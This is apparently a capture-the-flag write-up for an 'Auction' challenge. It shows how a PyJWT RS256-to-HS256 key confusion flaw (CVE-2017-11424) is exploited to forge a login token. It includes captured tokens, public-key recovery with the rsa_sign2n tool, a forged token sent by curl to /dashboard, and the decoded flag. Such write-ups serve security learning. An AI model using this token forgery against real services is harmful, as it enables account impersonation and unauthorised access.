# Auction

1. PyJWT Vulnerability (CVE-2017-11424): `2 JWTs` Generates `Public Key`
2. JWT Confusion Attack: RS256 Into HS256
1. 2 Different JWT Tokens on server
```
# User: Guest (Not Logged In)
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.NUw_YAKRQqqb1koRDPywWgTRPiHKP6Sa3PTddFmZ2SZOvAxnDF57Xeg4Cw1LMDC8sGLEeTvM9QvhLMACwNqmpYwrLm2XhxvCejTEcAAdrlzzt0A5YLqzlcKPfr-JoeJlouCzW8vDLggwOCAMsuJ3a7SchCpBNE9IkmdDDlh8SBfo57wzVR0MbHyWo6GNdpSeQWvQ5SEHFqZ8DzhNRRsv0cx1QVPHHkfrV-K9sNWpD6EtsTn11qK9cqyJyLNOFyYlI2_EJah-9slvThKmd7eQqcE2drsJuqvMYEMDEmbMAia48jRARHOaYoFbipZNOjn_kl0h6o81WKXCaYc2nnsb6g

# User: Bob
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImJvYiJ9.OC5bmcbCZgZ6p6-MHTw-kXH62M5GZiFe90af8BShJagccGVszxIxTVC7ybrddq-dgngPL5oyNVqCvQFcS9QE22yTB5MkaJnmP-oD1aiu4MYwgsF7UfLMUf2m2t1xP31gDGSD0kSHg8uuxswxWuXdz8AS1P6L7m2hyYTo6_5B6eXaRq6VmDNU_RrF4QK9R620Qd0J1hwVaWrokz3UdUcr0NUtGmdN1jlA2Vt8RIYm48SzLAQeViLQ4Br3HxiGWDXHdDEr0hVY0Jna6yJsBoOfc7jJurJRkWD2Kgyj1sDI-ZQXJg5UolfC26vnfwp7jcSsYDrm4GjnVqrcaVjBeb3tAw

# User: alice
```
2. Get Servers, Public Key from JWTs
```
# Starting Docker
https://github.com/silentsignal/rsa_sign2n/tree/release/standalone
```

3. I made Some slight Changes in: [🗂 jwt_frogery.py](./r2sign/jwt_forgery.py) Line: **43**
3.1. Add `run.sh` to Auto Start Docker
3.2. Add Lines `42-43` into `jwt_frogery.py` for Simple JWT Editing
4. set 2 JWT tokens in [🗂 run.sh](./r2sign/run.sh)
5. Make Sure `Docker` is running!
6. Run: `cd r2sign && ./run.sh`
7. Set Out comming JWTs in Burp and request for `/dashboard`
```
# Curl Command
curl -i -s -k -X $'GET' \
    -H $'Host: auction.petromaz.ir' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: close' -H $'Referer: http://auction.petromaz.ir/' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhbGljZSIsICJleHAiOiAxNzEyMDA4NzYzfQ.Z826hnO0RwhxlYsg-Wo_N-JZ_h0v6DXqyJQHU-Ug5VE' \
    $'http://auction.petromaz.ir/dashboard'
```
8. Get Alice's Secret
```
0xcf0xa50x4d0xbd0x820x930x200xd90xbd0x810x350x3f0x0b0x260x6d0x240xa00x1d0xa30x790x9f0x380x4d0x3b0xb40xdb0x390x700x1f0x900xec0x010xa60x1b0xf70xc10x4d0x230x190x600xd30x6f0x700x3c0xaf0xeb0xf70x200x1a0xde0x7a0xb50xf00x790x4e0x960x8d0xc10x600x230x0a0x900xd40x730x590x300x020xde0x5a0x340x2d0xdd0x420xf90xd90x2b0x7d0x400x300x440x760x8a0x840xd00xef0xb60x830xef0x440xe30x930xca0x1d0x150x4f0x770x3c0x580xbe0x760x550xf40x4d0x9c0x960xb60xf90xc90xfb0xae0xdf0x050x260xd60x1d0xed0x880x250xcb0x6c0x270x9c0x8b0xda0x830x450x960x660x010xd70x350xcd0xff0xc30x500x700x0d0x6a0xc50x5e0x520xad0xe70x7e0xe00x910xb50x350x250x520xa80x190xf50x8c0x870xf10x140xe90xb10x360xf60xa60xa50xcb0x680xbf0x480x9d0x1d0x470xd80xba0xf90xca0xfd0x580x3d0x800x6b0xa30x080xc90x8f0xbe0x8b0x500xc80x610x5d0x180x3b0xa40x7d0xc80xd20xa70xc10x0a0x470x3d0xcb0xa30x240x8e0x5d0x510x440x8a0xca0x560xaa0x110x530xe30x6d0x140x920xe10x2c0x2e0xb00x1f0x350x340x650x1a0x770x090xe10x880x4c0xdc0x750xb60x230xf90x0f0x930xdf0x030xdc0xfd0xcc0x520x710x6a0xe0
```
9. Decoding The Crypto: `python3 decode.py`
```
...--- MAZAPA_4a5565650c1310943bab2ba696362dbf ---...
```